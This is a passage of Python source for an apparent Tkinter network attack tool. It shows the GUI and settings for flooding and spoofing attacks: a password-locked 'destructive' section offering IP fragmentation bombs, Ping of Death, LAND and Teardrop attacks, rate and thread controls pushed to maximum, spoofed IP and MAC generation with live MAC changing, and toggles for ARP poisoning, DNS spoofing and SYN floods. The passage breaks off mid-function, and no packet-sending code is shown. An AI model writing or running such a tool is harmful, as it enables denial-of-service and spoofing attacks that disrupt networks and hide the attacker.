        self.unlock_label = ttk.Label(dest_unlock_frame, text="[LOCKED] Type Password:", 
                                     font=('Courier', 9, 'bold'), foreground='#ff0000')
        self.unlock_label.pack(side='left')
        
        # Password entry field for destructive unlock
        self.dest_entry_var = tk.StringVar()
        self.dest_entry = tk.Entry(dest_unlock_frame, textvariable=self.dest_entry_var, 
                                  show="*", width=12, font=('Courier', 12, 'bold'),
                                  bg='#220000', fg='#ff6666', insertbackground='#ff6666',
                                  relief='flat', justify='center')
        self.dest_entry.pack(side='left', padx=10)
        self.dest_entry.bind('<Return>', lambda e: self.check_dest_password())
        self.dest_entry.bind('<KeyRelease>', self.on_dest_entry_change)
        
        # Destructive attacks container (hidden until unlocked)
        self.destructive_container = ttk.Frame(destructive_section_frame)
        # Don't pack yet - will pack when unlocked
        
        # IP Fragmentation Bomb
        frag_frame = ttk.Frame(self.destructive_container)
        frag_frame.pack(fill='x', pady=2)
        self.vector_fragmentation_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(frag_frame, text="[*] IP Fragmentation Bomb", variable=self.vector_fragmentation_var).pack(side='left')
        tk.Button(frag_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Fragmentation Bomb (ROOT)", "Sends malformed overlapping fragments. Crashes routers/firewalls. Requires root.")).pack(side='left', padx=5)
        
        # Ping of Death
        pod_frame = ttk.Frame(self.destructive_container)
        pod_frame.pack(fill='x', pady=2)
        self.vector_ping_death_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(pod_frame, text="[*] Ping of Death", variable=self.vector_ping_death_var).pack(side='left')
        tk.Button(pod_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Ping of Death (ROOT)", "Sends oversized ICMP packets (>65KB). Crashes legacy systems. Requires root.")).pack(side='left', padx=5)
        
        # LAND Attack
        land_frame = ttk.Frame(self.destructive_container)
        land_frame.pack(fill='x', pady=2)
        self.vector_land_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(land_frame, text="[*] LAND Attack", variable=self.vector_land_var).pack(side='left')
        tk.Button(land_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("LAND Attack (ROOT)", "Source IP = Destination IP. Creates infinite loops, freezes systems. Requires root.")).pack(side='left', padx=5)
        
        # Teardrop Attack
        tear_frame = ttk.Frame(self.destructive_container)
        tear_frame.pack(fill='x', pady=2)
        self.vector_teardrop_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(tear_frame, text="[*] Teardrop Attack", variable=self.vector_teardrop_var).pack(side='left')
        tk.Button(tear_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Teardrop (ROOT)", "Overlapping IP fragments. Crashes systems on reassembly. Requires root.")).pack(side='left', padx=5)
        
        # Separator
        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Advanced Configuration
        advanced_frame = ttk.LabelFrame(left_column, text="[ADVANCED CONFIGURATION]", padding=15)
        advanced_frame.pack(fill='x', pady=(0, 10))
        
        # Packet Size Configuration
        ttk.Label(advanced_frame, text="Packet Size Control:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        size_container = ttk.Frame(advanced_frame)
        size_container.pack(fill='x', pady=5)
        
        size_min_frame = ttk.Frame(size_container)
        size_min_frame.pack(fill='x', pady=2)
        ttk.Label(size_min_frame, text="Min Size (bytes):", font=('Courier', 9)).pack(side='left')
        self.packet_size_min_var = tk.IntVar(value=512)
        size_min_spin = tk.Spinbox(size_min_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_min_var, font=('Courier', 9),
                                   width=8, command=self.update_packet_size,
                                   bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        size_min_spin.pack(side='right')
        
        size_max_frame = ttk.Frame(size_container)
        size_max_frame.pack(fill='x', pady=2)
        ttk.Label(size_max_frame, text="Max Size (bytes):", font=('Courier', 9)).pack(side='left')
        self.packet_size_max_var = tk.IntVar(value=2048)
        size_max_spin = tk.Spinbox(size_max_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_max_var, font=('Courier', 9),
                                   width=8, command=self.update_packet_size,
                                   bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        size_max_spin.pack(side='right')
        
        # Packet size presets
        size_preset_frame = ttk.Frame(advanced_frame)
        size_preset_frame.pack(fill='x', pady=5)
        ttk.Label(size_preset_frame, text="Size Presets:", font=('Courier', 9)).pack(side='left', padx=(0, 5))
        
        size_preset_row1 = ttk.Frame(size_preset_frame)
        size_preset_row1.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Tiny", 64, 256), ("Small", 256, 512), ("Medium", 512, 2048)]:
            btn = tk.Button(size_preset_row1, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        size_preset_row2 = ttk.Frame(size_preset_frame)
        size_preset_row2.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Large", 2048, 8192), ("Huge", 8192, 65536), ("1 MB", 1048576, 1048576)]:
            btn = tk.Button(size_preset_row2, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Send Rate Configuration
        ttk.Label(advanced_frame, text="Send Rate Control:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        rate_frame = ttk.Frame(advanced_frame)
        rate_frame.pack(fill='x', pady=5)
        
        rate_header = ttk.Frame(rate_frame)
        rate_header.pack(fill='x')
        ttk.Label(rate_header, text="Packets/sec per thread:", font=('Courier', 9)).pack(side='left')
        tk.Button(rate_header, text="[MAX]", command=lambda: self.send_rate_var.set(10000) or self.update_send_rate(10000),
                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
        self.rate_value_label = ttk.Label(rate_header, text="10000", font=('Courier', 9, 'bold'),
                                         foreground=self.accent_color)
        self.rate_value_label.pack(side='right')
        
        self.send_rate_var = tk.IntVar(value=10000)
        rate_scale = ttk.Scale(rate_frame, from_=100, to=10000, variable=self.send_rate_var,
                              orient='horizontal', command=self.update_send_rate)
        rate_scale.pack(fill='x', pady=2)
        
        # Rate presets
        rate_preset_frame = ttk.Frame(advanced_frame)
        rate_preset_frame.pack(fill='x', pady=5)
        ttk.Label(rate_preset_frame, text="Rate Presets:", font=('Courier', 9)).pack(side='left', padx=(0, 5))
        
        for name, rate in [("Slow", 100), ("Normal", 1000), ("Fast", 5000), ("MAX", 10000)]:
            btn = tk.Button(rate_preset_frame, text=name,
                          command=lambda r=rate: self.send_rate_var.set(r) or self.update_send_rate(r),
                          bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Burst Size Configuration
        ttk.Label(advanced_frame, text="Burst Size:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        burst_frame = ttk.Frame(advanced_frame)
        burst_frame.pack(fill='x', pady=5)
        
        burst_header = ttk.Frame(burst_frame)
        burst_header.pack(fill='x')
        ttk.Label(burst_header, text="Packets per burst:", font=('Courier', 9)).pack(side='left')
        tk.Button(burst_header, text="[MAX]", command=lambda: self.burst_size_var.set(100) or self.update_burst_size(100),
                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
        self.burst_value_label = ttk.Label(burst_header, text="100", font=('Courier', 9, 'bold'),
                                          foreground=self.accent_color)
        self.burst_value_label.pack(side='right')
        
        self.burst_size_var = tk.IntVar(value=100)
        burst_scale = ttk.Scale(burst_frame, from_=1, to=100, variable=self.burst_size_var,
                               orient='horizontal', command=self.update_burst_size)
        burst_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Thread Multiplier
        ttk.Label(advanced_frame, text="Thread Multiplier:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        thread_frame = ttk.Frame(advanced_frame)
        thread_frame.pack(fill='x', pady=5)
        
        thread_header = ttk.Frame(thread_frame)
        thread_header.pack(fill='x')
        ttk.Label(thread_header, text="Threads per intensity:", font=('Courier', 9)).pack(side='left')
        tk.Button(thread_header, text="[MAX]", command=lambda: self.thread_multiplier_var.set(20) or self.update_thread_multiplier(20),
                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
        self.thread_value_label = ttk.Label(thread_header, text="20x", font=('Courier', 9, 'bold'),
                                           foreground=self.accent_color)
        self.thread_value_label.pack(side='right')
        
        self.thread_multiplier_var = tk.IntVar(value=20)
        thread_scale = ttk.Scale(thread_frame, from_=1, to=20, variable=self.thread_multiplier_var,
                                orient='horizontal', command=self.update_thread_multiplier)
        thread_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Preloading
        ttk.Label(advanced_frame, text="Packet Preloading:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        preload_enable_frame = ttk.Frame(advanced_frame)
        preload_enable_frame.pack(fill='x', pady=5)
        ttk.Label(preload_enable_frame, text="Enable Preloading", font=('Courier', 9)).pack(side='left')
        self.preload_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(preload_enable_frame, variable=self.preload_var,
                       command=self.update_preload_setting).pack(side='right')
        
        preload_count_frame = ttk.Frame(advanced_frame)
        preload_count_frame.pack(fill='x', pady=2)
        ttk.Label(preload_count_frame, text="Preload Count:", font=('Courier', 9)).pack(side='left')
        self.preload_count_var = tk.IntVar(value=10000)
        preload_spin = tk.Spinbox(preload_count_frame, from_=100, to=10000, increment=100,
                                 textvariable=self.preload_count_var, font=('Courier', 9),
                                 width=8, command=self.update_preload_count,
                                 bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        preload_spin.pack(side='right')
        
        preload_btn = tk.Button(advanced_frame, text="[>] Preload Packets Now",
                               command=self.preload_packets_now,
                               bg='#003300', fg=self.accent_color, font=('Courier', 9, 'bold'),
                               relief='ridge', bd=2, cursor='hand2', activebackground='#005500')
        preload_btn.pack(fill='x', pady=5)
        
        self.preload_status = ttk.Label(advanced_frame, text="Packets ready: 0",
                                       font=('Courier', 9), foreground=self.warning_color)
        self.preload_status.pack(anchor='w', pady=2)
        
        # Network Info
        network_frame = ttk.LabelFrame(left_column, text="[NETWORK INFORMATION]", padding=15)
        network_frame.pack(fill='x', pady=(0, 10))
        
        self.network_label = ttk.Label(network_frame, text="Interface: Detecting...", font=('Courier', 9))
        self.network_label.pack(anchor='w', pady=2)
        
        self.ping_target_frame = ttk.Frame(network_frame)
        self.ping_target_frame.pack(fill='x', pady=5)
        ttk.Label(self.ping_target_frame, text="Ping Target:", font=('Courier', 9)).pack(side='left')
        self.ping_target_entry = tk.Entry(self.ping_target_frame, font=('Courier', 9), width=15,
                                         bg='#001100', fg=self.accent_color, insertbackground=self.accent_color)
        self.ping_target_entry.insert(0, "8.8.8.8")
        self.ping_target_entry.pack(side='left', padx=5)
        self.ping_target_entry.bind('<Return>', lambda e: self.update_ping_target())
        
        root_text = "[+] Root Access: YES" if self.is_root else "[-] Root Access: NO"
        root_color = self.success_color if self.is_root else self.danger_color
        self.root_label = ttk.Label(network_frame, text=root_text, font=('Courier', 9, 'bold'),
                                    foreground=root_color)
        self.root_label.pack(anchor='w', pady=2)
        
        scapy_text = f"[+] Scapy: Available" if self.scapy_available else "[-] Scapy: Not Installed"
        scapy_color = self.success_color if self.scapy_available else self.warning_color
        self.scapy_label = ttk.Label(network_frame, text=scapy_text, font=('Courier', 9, 'bold'),
                                     foreground=scapy_color)
        self.scapy_label.pack(anchor='w', pady=2)
        
        # === RIGHT COLUMN CONTENT ===
        
        # Real-time Statistics
        stats_frame = ttk.LabelFrame(right_column, text="[REAL-TIME STATISTICS]", padding=15)
        stats_frame.pack(fill='x', pady=(0, 10))
        
        # Status
        status_container = ttk.Frame(stats_frame)
        status_container.pack(fill='x', pady=5)
        ttk.Label(status_container, text="Status:", font=('Courier', 10)).pack(side='left')
        self.status_label = ttk.Label(status_container, text="Idle", font=('Courier', 10, 'bold'),
                                     foreground=self.warning_color)
        self.status_label.pack(side='left', padx=10)
        
        # Create stats grid
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', pady=10)
        
        # Packets sent
        packets_frame = ttk.Frame(stats_grid)
        packets_frame.pack(fill='x', pady=3)
        ttk.Label(packets_frame, text="Packets Sent:", font=('Courier', 10)).pack(side='left')
        self.packets_label = ttk.Label(packets_frame, text="0", style='Stat.TLabel')
        self.packets_label.pack(side='right')
        
        # Packet rate
        pps_frame = ttk.Frame(stats_grid)
        pps_frame.pack(fill='x', pady=3)
        ttk.Label(pps_frame, text="Packet Rate:", font=('Courier', 10)).pack(side='left')
        self.rate_label = ttk.Label(pps_frame, text="0 pps", style='Stat.TLabel')
        self.rate_label.pack(side='right')
        
        # Bandwidth
        bandwidth_frame = ttk.Frame(stats_grid)
        bandwidth_frame.pack(fill='x', pady=3)
        ttk.Label(bandwidth_frame, text="Bandwidth:", font=('Courier', 10)).pack(side='left')
        self.bandwidth_label = ttk.Label(bandwidth_frame, text="0 KB/s", style='Stat.TLabel')
        self.bandwidth_label.pack(side='right')
        
        # Data sent
        data_frame = ttk.Frame(stats_grid)
        data_frame.pack(fill='x', pady=3)
        ttk.Label(data_frame, text="Data Sent:", font=('Courier', 10)).pack(side='left')
        self.data_label = ttk.Label(data_frame, text="0 KB", style='Stat.TLabel')
        self.data_label.pack(side='right')
        
        # Data downloaded
        download_data_frame = ttk.Frame(stats_grid)
        download_data_frame.pack(fill='x', pady=3)
        ttk.Label(download_data_frame, text="Data Downloaded:", font=('Courier', 10)).pack(side='left')
        self.download_data_label = ttk.Label(download_data_frame, text="0 KB", style='Stat.TLabel')
        self.download_data_label.pack(side='right')
        
        # Duration
        time_frame = ttk.Frame(stats_grid)
        time_frame.pack(fill='x', pady=3)
        ttk.Label(time_frame, text="Duration:", font=('Courier', 10)).pack(side='left')
        self.time_label = ttk.Label(time_frame, text="0s", style='Stat.TLabel')
        self.time_label.pack(side='right')
        
        # Network Performance
        perf_frame = ttk.LabelFrame(right_column, text="[NETWORK PERFORMANCE]", padding=15)
        perf_frame.pack(fill='x', pady=(0, 10))
        
        # Ping
        ping_container = ttk.Frame(perf_frame)
        ping_container.pack(fill='x', pady=3)
        ttk.Label(ping_container, text="Ping:", font=('Courier', 10)).pack(side='left')
        self.ping_label = ttk.Label(ping_container, text="Measuring...", style='Stat.TLabel')
        self.ping_label.pack(side='right')
        
        # Download Speed
        download_container = ttk.Frame(perf_frame)
        download_container.pack(fill='x', pady=3)
        ttk.Label(download_container, text="Download Speed:", font=('Courier', 10)).pack(side='left')
        self.download_label = ttk.Label(download_container, text="Measuring...", style='Stat.TLabel')
        self.download_label.pack(side='right')
        
        # Thread count
        threads_container = ttk.Frame(perf_frame)
        threads_container.pack(fill='x', pady=3)
        ttk.Label(threads_container, text="Active Threads:", font=('Courier', 10)).pack(side='left')
        self.threads_label = ttk.Label(threads_container, text="0", style='Stat.TLabel')
        self.threads_label.pack(side='right')
        
        # Attack Log
        log_frame = ttk.LabelFrame(right_column, text="[ACTIVITY LOG]", padding=15)
        log_frame.pack(fill='both', expand=True)
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        
        # Create scrolled text widget
        log_scroll = ttk.Scrollbar(log_frame)
        log_scroll.grid(row=0, column=1, sticky='ns')
        
        self.log_text = tk.Text(log_frame, height=15, bg='#1e1e1e', fg=self.accent_color,
                               font=('Courier', 9), wrap='word', yscrollcommand=log_scroll.set)
        self.log_text.grid(row=0, column=0, sticky='nsew')
        log_scroll.config(command=self.log_text.yview)
        
        self.log_message("System initialized", "INFO")
        self.log_message("Awaiting attack configuration...", "INFO")
        if self.is_root:
            self.log_message("Root privileges detected - Full features available", "INFO")
        else:
            self.log_message("Running without root - Some features disabled", "WARNING")
        if self.scapy_available:
            self.log_message("Scapy library detected - Advanced packet crafting available", "INFO")
        
        # Apply scroll bindings to all child widgets
        bind_tree(main_frame, on_left_mousewheel, on_left_scroll_up, on_left_scroll_down)
        bind_tree(right_main_frame, on_right_mousewheel, on_right_scroll_up, on_right_scroll_down)
    
    def log_message(self, message, level="INFO"):
        """Add message to activity log"""
        timestamp = time.strftime("%H:%M:%S")
        color_map = {
            "INFO": "#00ff00",
            "WARNING": "#ffff00",
            "ERROR": "#ff0000",
            "ATTACK": "#ff00ff"
        }
        
        self.log_text.insert('end', f"[{timestamp}] ", 'timestamp')
        self.log_text.insert('end', f"[{level}] ", level)
        self.log_text.insert('end', f"{message}\n")
        
        self.log_text.tag_config('timestamp', foreground='#888888')
        self.log_text.tag_config(level, foreground=color_map.get(level, '#00ff00'))
        
        self.log_text.see('end')
        
        # Limit log size
        if int(self.log_text.index('end-1c').split('.')[0]) > 500:
            self.log_text.delete('1.0', '100.0')
    
    def update_ping_target(self):
        """Update ping target from entry"""
        new_target = self.ping_target_entry.get().strip()
        if new_target:
            self.ping_target = new_target
            self.log_message(f"Ping target changed to {new_target}", "INFO")
    
    def start_ping_monitor(self):
        """Start ping monitoring in background"""
        self.ping_monitoring = True
        threading.Thread(target=self.ping_monitor_thread, daemon=True).start()
    
    def start_download_monitor(self):
        """Start download speed monitoring in background"""
        self.download_monitoring = True
        threading.Thread(target=self.download_monitor_thread, daemon=True).start()
    
    def download_monitor_thread(self):
        """Monitor download speed in background"""
        import urllib.request
        
        # Use larger files for more accurate speed testing
        test_urls = [
            "http://speedtest.tele2.net/1MB.zip",
            "http://ipv4.download.thinkbroadband.com/1MB.zip",
            "http://proof.ovh.net/files/1Mb.dat"
        ]
        
        while self.download_monitoring:
            try:
                test_url = random.choice(test_urls)
                start_time = time.time()
                total_bytes = 0
                
                # Stream download with larger chunk size
                with urllib.request.urlopen(test_url, timeout=5) as response:
                    chunk_size = 131072  # 128KB chunks
                    while True:
                        chunk = response.read(chunk_size)
                        if not chunk:
                            break
                        total_bytes += len(chunk)
                    
                    download_time = time.time() - start_time
                    
                    if download_time > 0:
                        # Calculate speed in bytes per second
                        self.current_download_speed = int(total_bytes / download_time)
                    else:
                        self.current_download_speed = 0
            except Exception as e:
                self.current_download_speed = 0
            
            time.sleep(3)  # Test every 3 seconds for faster updates
    
    def ping_monitor_thread(self):
        """Monitor ping in background"""
        while self.ping_monitoring:
            try:
                result = subprocess.run(['ping', '-c', '1', '-W', '1', self.ping_target],
                                      capture_output=True, text=True, timeout=2)
                
                # Parse ping result
                if result.returncode == 0:
                    match = re.search(r'time=(\d+\.?\d*)\s*ms', result.stdout)
                    if match:
                        self.current_ping = int(float(match.group(1)))
                    else:
                        self.current_ping = -1
                else:
                    self.current_ping = -1
                    
            except:
                self.current_ping = -1
            
            time.sleep(2)  # Ping every 2 seconds
    
    def format_bytes(self, bytes_val):
        """Format bytes to human readable"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024.0:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024.0
        return f"{bytes_val:.2f} TB"
    
    def update_packet_size(self):
        """Update packet size settings"""
        self.packet_size_min = self.packet_size_min_var.get()
        self.packet_size_max = self.packet_size_max_var.get()
        
        # Ensure min <= max
        if self.packet_size_min > self.packet_size_max:
            self.packet_size_min_var.set(self.packet_size_max)
            self.packet_size_min = self.packet_size_max
        
        self.log_message(f"Packet size range: {self.packet_size_min}-{self.packet_size_max} bytes", "INFO")
    
    def set_packet_size_preset(self, min_size, max_size):
        """Set packet size preset"""
        self.packet_size_min_var.set(min_size)
        self.packet_size_max_var.set(max_size)
        self.update_packet_size()
    
    def update_send_rate(self, value):
        """Update send rate setting"""
        self.send_rate = int(float(value))
        self.rate_value_label.config(text=f"{self.send_rate}")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "INFO")
    
    def update_burst_size(self, value):
        """Update burst size setting"""
        self.burst_size = int(float(value))
        self.burst_value_label.config(text=f"{self.burst_size}")
        self.log_message(f"Burst size: {self.burst_size} packets", "INFO")
    
    def update_thread_multiplier(self, value):
        """Update thread multiplier setting"""
        self.thread_multiplier = int(float(value))
        self.thread_value_label.config(text=f"{self.thread_multiplier}x")
        self.log_message(f"Thread multiplier: {self.thread_multiplier}x", "INFO")
    
    def update_preload_setting(self):
        """Update preload enable/disable"""
        self.preload_enabled = self.preload_var.get()
        status = "enabled" if self.preload_enabled else "disabled"
        self.log_message(f"Packet preloading {status}", "INFO")
    
    def update_preload_count(self):
        """Update preload count"""
        self.preload_count = self.preload_count_var.get()
        self.log_message(f"Preload count: {self.preload_count} packets", "INFO")
    
    def preload_packets_now(self):
        """Preload packets into memory"""
        self.log_message("Preloading packets into memory...", "INFO")
        threading.Thread(target=self._preload_packets_thread, daemon=True).start()
    
    def _preload_packets_thread(self):
        """Thread to preload packets"""
        self.preloaded_packets = []
        
        for i in range(self.preload_count):
            # Generate random packet data
            size = random.randint(self.packet_size_min, self.packet_size_max)
            packet_data = bytes(random.getrandbits(8) for _ in range(size))
            
            # Store packet with metadata
            self.preloaded_packets.append({
                'data': packet_data,
                'size': size,
                'target': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
                'port': random.randint(1, 65535)
            })
            
            # Update status every 100 packets
            if (i + 1) % 100 == 0:
                self.frame.after(0, lambda count=i+1: self.preload_status.config(
                    text=f"Packets ready: {count}/{self.preload_count}"))
        
        total_bytes = sum(p['size'] for p in self.preloaded_packets)
        self.frame.after(0, lambda: self.preload_status.config(
            text=f"Packets ready: {len(self.preloaded_packets)} ({self.format_bytes(total_bytes)})",
            foreground=self.success_color))
        self.frame.after(0, lambda: self.log_message(
            f"Preloaded {len(self.preloaded_packets)} packets ({self.format_bytes(total_bytes)})", "INFO"))
    
    def detect_network_interface(self):
        """Detect active network interface on Linux"""
        try:
            result = subprocess.run(['ip', 'route', 'get', '1'],
                                  capture_output=True, text=True, timeout=2)
            
            if_match = re.search(r'dev (\S+)', result.stdout)
            if if_match:
                self.current_interface = if_match.group(1)
                self.get_current_mac()
                self.generate_spoofed_identifiers()
                self.update_network_display()
        except Exception as e:
            print(f"Error detecting interface: {e}")
            self.current_interface = "Unknown"
            self.generate_spoofed_identifiers()
    
    def get_current_mac(self):
        """Get current MAC address on Linux"""
        if not self.current_interface:
            return
        try:
            with open(f'/sys/class/net/{self.current_interface}/address', 'r') as f:
                self.current_mac = f.read().strip()
                if not self.original_mac:
                    self.original_mac = self.current_mac
        except:
            pass
    
    def generate_random_mac(self):
        """Generate random MAC address"""
        mac = [0x02,
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join([f'{x:02x}' for x in mac])
    
    def generate_spoofed_identifiers(self):
        """Generate spoofed IP and MAC for packets"""
        self.spoofed_ip = f"{random.randint(10, 200)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.spoofed_mac = self.generate_random_mac()
        self.frame.after(0, self.update_spoof_display)
    
    def update_network_display(self):
        """Update network info display"""
        if self.current_interface:
            self.network_label.config(text=f"Interface: {self.current_interface}")
            self.mac_status.config(text=f"Current MAC: {self.current_mac or 'Unknown'}")
    
    def update_spoof_display(self):
        """Update spoofing info display"""
        self.spoof_status.config(text=f"Spoofed IP: {self.spoofed_ip} | MAC: {self.spoofed_mac}")
    
    def on_mac_toggle(self):
        """Handle MAC randomization toggle"""
        self.mac_randomization = self.mac_var.get()
    
    def on_randomize_mac_now(self):
        """Randomize MAC address on Linux"""
        if not self.is_root:
            messagebox.showerror("Root Required",
                               "This feature requires root privileges.\n\n"
                               "Please run this program with sudo.")
            return
        
        new_mac = self.generate_random_mac()
        
        response = messagebox.askyesno("Change MAC Address?",
            f"This will temporarily disconnect you from the network.\n\n"
            f"Interface: {self.current_interface}\n"
            f"Current MAC: {self.current_mac}\n"
            f"New MAC: {new_mac}\n\n"
            f"This requires root privileges.")
        
        if response:
            threading.Thread(target=self.change_mac_address, args=(new_mac,), daemon=True).start()
    
    def change_mac_address(self, new_mac):
        """Change MAC address on Linux"""
        try:
            subprocess.run(['ip', 'link', 'set', self.current_interface, 'down'], check=True, timeout=10)
            subprocess.run(['ip', 'link', 'set', self.current_interface, 'address', new_mac], check=True, timeout=10)
            subprocess.run(['ip', 'link', 'set', self.current_interface, 'up'], check=True, timeout=10)
            
            self.current_mac = new_mac
            self.frame.after(0, self.update_network_display)
            self.frame.after(0, lambda: self.log_message(f"MAC address changed to {new_mac}", "INFO"))
            self.frame.after(0, lambda: messagebox.showinfo(
                "MAC Address Changed",
                f"Successfully changed to {new_mac}\n\nReconnecting to network..."
            ))
        except Exception as e:
            self.frame.after(0, lambda: self.log_message(f"MAC change failed: {str(e)}", "ERROR"))
            self.frame.after(0, lambda: messagebox.showerror(
                "MAC Change Failed",
                f"Error: {str(e)}\n\nMake sure you have root privileges."
            ))
    
    def on_obfuscation_toggle(self):
        """Handle traffic obfuscation toggle"""
        self.traffic_obfuscation = self.obfus_var.get()
    
    def on_raw_socket_toggle(self):
        """Handle raw socket toggle"""
        self.raw_socket_enabled = self.raw_socket_var.get()
        status = "enabled" if self.raw_socket_enabled else "disabled"
        self.log_message(f"Raw socket support {status}", "INFO")
    
    def on_scapy_toggle(self):
        """Handle scapy toggle"""
        self.use_scapy = self.scapy_var.get()
        status = "enabled" if self.use_scapy else "disabled"
        self.log_message(f"Scapy packet crafting {status}", "INFO")
    
    def on_arp_toggle(self):
        """Handle ARP poisoning toggle"""
        self.arp_poison_enabled = self.arp_var.get()
        status = "enabled" if self.arp_poison_enabled else "disabled"
        self.log_message(f"ARP cache poisoning {status}", "ATTACK" if self.arp_poison_enabled else "INFO")
    
    def on_dns_toggle(self):
        """Handle DNS spoofing toggle"""
        self.dns_spoof_enabled = self.dns_var.get()
        status = "enabled" if self.dns_spoof_enabled else "disabled"
        self.log_message(f"DNS response spoofing {status}", "ATTACK" if self.dns_spoof_enabled else "INFO")
    
    def on_syn_raw_toggle(self):
        """Handle raw SYN flood toggle"""
        self.syn_flood_raw = self.syn_raw_var.get()
        status = "enabled" if self.syn_flood_raw else "disabled"
        self.log_message(f"Raw SYN flood {status}", "INFO")
    
    def on_preset_click(self, level):
        """Handle preset intensity clicks"""
        self.intensity_var.set(level)
        self.on_intensity_changed(None)
    
    def set_safe_mode(self):
        """Enable only non-root attack vectors"""
        # Highlight active tab
        self.mode_safe_btn.config(bg='#003300', relief='ridge')
        self.mode_full_btn.config(bg='#001100', relief='ridge')
        self.mode_custom_btn.config(bg='#001100', relief='ridge')
        
        # Enable safe vectors (no root required)
        self.vector_udp_var.set(True)
        self.vector_tcp_var.set(True)
        self.vector_broadcast_var.set(True)
        
        # Disable root-required vectors
        self.syn_raw_var.set(False)
        self.arp_poison_var.set(False)
        self.dns_spoof_var.set(False)
        
        self.log_message("[MODE] No Root Required - Safe vectors enabled", "SUCCESS")
    
    def set_full_mode(self):
        """Enable all attack vectors"""
        # Highlight active tab
        self.mode_safe_btn.config(bg='#001100', relief='ridge')
        self.mode_full_btn.config(bg='#330000', relief='ridge')
        self.mode_custom_btn.config(bg='#001100', relief='ridge')
        
        # Enable all vectors
        self.vector_udp_var.set(True)
        self.vector_tcp_var.set(True)
        self.vector_broadcast_var.set(True)
        self.syn_raw_var.set(True)
        self.arp_poison_var.set(True)
        self.dns_spoof_var.set(True)
        
        if not self.is_root:
            self.log_message("[MODE] Full Arsenal - WARNING: Root required for some vectors!", "WARNING")
        else:
            self.log_message("[MODE] Full Arsenal - All vectors enabled", "ATTACK")
    
    def set_custom_mode(self):
        """Set custom mode - user controls vectors manually"""
        # Highlight active tab
        self.mode_safe_btn.config(bg='#001100', relief='ridge')
        self.mode_full_btn.config(bg='#001100', relief='ridge')
        self.mode_custom_btn.config(bg='#003333', relief='ridge')
        
        self.log_message("[MODE] Custom - Manual vector selection", "INFO")
    
    def show_info(self, title, message):
        """Show info popup for attack vectors"""
        import tkinter.messagebox as msgbox
        msgbox.showinfo(title, message)
    
    def on_amp_entry_change(self, event=None):
        """Handle amplification password entry changes"""
        if self.amp_failed_attempts >= 3:
            self.amp_entry_var.set("")
            return
        
        # Limit to digits only
        current = self.amp_entry_var.get()
        filtered = ''.join(filter(str.isdigit, current))
        if filtered != current:
            self.amp_entry_var.set(filtered)
    
    def check_amp_password(self):
        """Check amplification password"""
        if self.amp_failed_attempts >= 3:
            return
        
        entered = self.amp_entry_var.get()
        if not entered:
            return
        
        entered_code = [int(d) for d in entered]
        
